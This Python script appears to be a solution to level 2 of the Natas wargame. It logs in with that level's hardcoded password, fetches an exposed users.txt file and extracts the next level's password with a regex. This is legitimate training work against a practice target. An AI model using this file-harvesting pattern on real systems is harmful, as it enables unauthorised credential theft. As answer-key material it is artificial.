import requests
import base64
import re
from auth import *

user = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

requestData = genHeader(user,password)

headerData ={"Authorization":requestData["Authorization"]}

fileURL = requestData["URL"]+"/files/users.txt"
x = requests.post(url=fileURL,headers=headerData)

nextcode = re.findall('[a-zA-Z0-9]{32}',x.text)
print(f'The code for the next level is: {nextcode[0]}' )
